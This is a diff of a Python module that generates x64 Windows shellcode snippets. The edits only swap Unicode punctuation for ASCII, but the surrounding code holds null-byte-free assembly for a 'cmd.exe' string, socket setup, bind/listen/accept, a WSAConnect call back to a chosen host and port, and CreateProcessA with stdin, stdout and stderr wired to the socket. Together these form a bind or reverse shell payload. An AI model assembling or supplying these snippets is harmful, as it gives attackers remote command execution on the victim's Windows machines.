@@ -1,25 +1,25 @@
 """
-x64 assembly snippet blocks — Microsoft x64 ABI.
+x64 assembly snippet blocks - Microsoft x64 ABI.
 
 Register conventions (all snippets follow these):
-    RSI   socket handle — set by wsa_socket_tcp / accept, consumed by bind/listen/accept/startupinfoa
-    RDI   STARTUPINFOA pointer — set by startupinfoa blocks, consumed by createprocessa
-    RBX   command string pointer — set by cmd_string, consumed by createprocessa
+    RSI   socket handle - set by wsa_socket_tcp / accept, consumed by bind/listen/accept/startupinfoa
+    RDI   STARTUPINFOA pointer - set by startupinfoa blocks, consumed by createprocessa
+    RBX   command string pointer - set by cmd_string, consumed by createprocessa
 
 Calling convention reminders applied throughout:
   - First four args: RCX, RDX, R8, R9
   - Shadow space: 32 bytes (0x20) reserved below args before every CALL
   - Stack args beyond four: at [rsp+0x20], [rsp+0x28], ...
   - RSP must be 16-byte aligned before every CALL
-  - Callee does NOT clean stack — caller cleans its own sub rsp
-  - No pushad/popad — snippet saves/restores explicitly where needed
+  - Callee does NOT clean stack - caller cleans its own sub rsp
+  - No pushad/popad - snippet saves/restores explicitly where needed
 
 Stack pairing contract:
-  snippet_sockaddr_bind   — sub rsp, 0x10 (NOT cleaned here)
-  snippet_bind_listen_accept — ... add rsp, 0x10 at the end (paired cleanup)
+  snippet_sockaddr_bind   - sub rsp, 0x10 (NOT cleaned here)
+  snippet_bind_listen_accept - ... add rsp, 0x10 at the end (paired cleanup)
 
-  SNIPPET_CMD_STRING      — sub rsp, 0x10 (NOT cleaned; process terminates after use)
-  SNIPPET_STARTUPINFOA_*  — sub rsp, 0x70 (NOT cleaned; process terminates after use)
+  SNIPPET_CMD_STRING      - sub rsp, 0x10 (NOT cleaned; process terminates after use)
+  SNIPPET_STARTUPINFOA_*  - sub rsp, 0x70 (NOT cleaned; process terminates after use)
 """
 
 from shellcode.encoding import encode_ip, encode_port
@@ -32,7 +32,7 @@ def _slot(offset: int) -> str:
     return f'rbp+{hex(offset)}'
 
 
-# ── Static snippets ────────────────────────────────────────────────────────────
+# -- Static snippets ------------------------------------------------------------
 
 SNIPPET_STARTUPINFOA_SOCKET = """\
 create_startupinfoa:
@@ -54,10 +54,10 @@ create_startupinfoa:
     mov   [rsp+0x58], rax
     mov   [rsp+0x60], rax
     mov   [rsp+0x68], rax
-    ; cb = 0x68 (sizeof STARTUPINFOA in x64) — 0x68 has no null bytes
+    ; cb = 0x68 (sizeof STARTUPINFOA in x64) - 0x68 has no null bytes
     mov   byte ptr [rsp+0x00], 0x68
     ; dwFlags = STARTF_USESTDHANDLES (0x00000100)
-    ; LE bytes: 00 01 00 00 — write only the non-zero byte at offset +0x3D
+    ; LE bytes: 00 01 00 00 - write only the non-zero byte at offset +0x3D
     mov   byte ptr [rsp+0x3d], 0x01
     ; hStdInput / hStdOutput / hStdError = RSI (socket handle)
     mov   [rsp+0x50], rsi
@@ -91,14 +91,14 @@ SNIPPET_CMD_STRING = """\
 create_cmd_string:
     sub   rsp, 0x10                  ; 16-byte aligned space for "cmd.exe\\x00"
     xor   rax, rax
-    mov   eax, 0xff9a879b            ; negated encoding — no null bytes
+    mov   eax, 0xff9a879b            ; negated encoding - no null bytes
     neg   eax                        ; EAX = 0x00657865 = "exe\\x00"
     mov   dword ptr [rsp+0x04], eax  ; write "exe\\x00" at +4
     mov   dword ptr [rsp+0x00], 0x2e646d63  ; write "cmd." at +0
     mov   rbx, rsp                   ; RBX = "cmd.exe\\x00\""""
 
 
-# ── Parameterized snippets ─────────────────────────────────────────────────────
+# -- Parameterized snippets -----------------------------------------------------
 
 def snippet_createprocessa(slot: int) -> str:
     """
@@ -112,7 +112,7 @@ def snippet_createprocessa(slot: int) -> str:
         [rsp+0x30]        lpEnvironment = NULL
         [rsp+0x38]        lpCurrentDirectory = NULL
         [rsp+0x40]        lpStartupInfo = RDI
-        [rsp+0x48]        lpProcessInformation → [rsp+0x58]
+        [rsp+0x48]        lpProcessInformation -> [rsp+0x58]
         [rsp+0x50..0x6F]  PROCESS_INFORMATION buffer (zeroed)
     """
     return f"""\
@@ -160,7 +160,7 @@ call_terminateprocess:
 def snippet_wsa_init(slot: int) -> str:
     """
     Call WSAStartup(2.2, lpWSAData).
-    WSADATA buffer placed at [rbp-0x190] — well below the slot area.
+    WSADATA buffer placed at [rbp-0x190] - well below the slot area.
     """
     return f"""\
 call_wsastartup:
@@ -202,7 +202,7 @@ def snippet_sockaddr_bind(port: int) -> str:
     RSI must already hold the socket handle (set by snippet_wsa_socket_tcp).
     After this snippet: RDI = &sockaddr_in.
 
-    Stack contract: sub rsp, 0x10 here — NOT cleaned up.
+    Stack contract: sub rsp, 0x10 here - NOT cleaned up.
     snippet_bind_listen_accept adds rsp, 0x10 at its end (paired).
     """
     port_enc, port_warn = encode_port(port)
@@ -227,7 +227,7 @@ def snippet_bind_listen_accept(bind_slot: int,
                                 listen_slot: int,
                                 accept_slot: int) -> str:
     """
-    Call bind(RSI, RDI, 16) → listen(RSI, 0) → accept(RSI, NULL, NULL).
+    Call bind(RSI, RDI, 16) -> listen(RSI, 0) -> accept(RSI, NULL, NULL).
     After accept: RSI = accepted client socket.
     Cleans sockaddr_in from stack at the end (add rsp, 0x10).
     """
@@ -266,7 +266,7 @@ def snippet_wsaconnect(lhost: str, lport: int, slot: int) -> str:
     """
     ip_val,   ip_warn   = encode_ip(lhost)
     port_enc, port_warn = encode_port(lport)
-    ip_note   = f'    ; WARNING: {lhost} contains a zero octet — null byte in push\n' if ip_warn   else ''
+    ip_note   = f'    ; WARNING: {lhost} contains a zero octet - null byte in push\n' if ip_warn   else ''
     port_note = f'    ; WARNING: port {lport} produces a null byte\n'                 if port_warn else ''
     return f"""\
 call_wsaconnect:
@@ -275,7 +275,7 @@ call_wsaconnect:
     mov   [rsp], rax
     mov   [rsp+0x08], rax
     ; sin_addr = {lhost}
-{ip_note}    mov   eax, {hex(ip_val)}          ; {lhost} little-endian → network order at [rsp+4]
+{ip_note}    mov   eax, {hex(ip_val)}          ; {lhost} little-endian -> network order at [rsp+4]
     mov   dword ptr [rsp+0x04], eax
     ; sin_family | sin_port as dword
 {port_note}    mov   ax, {hex(port_enc)}                ; port {lport} (network byte order)
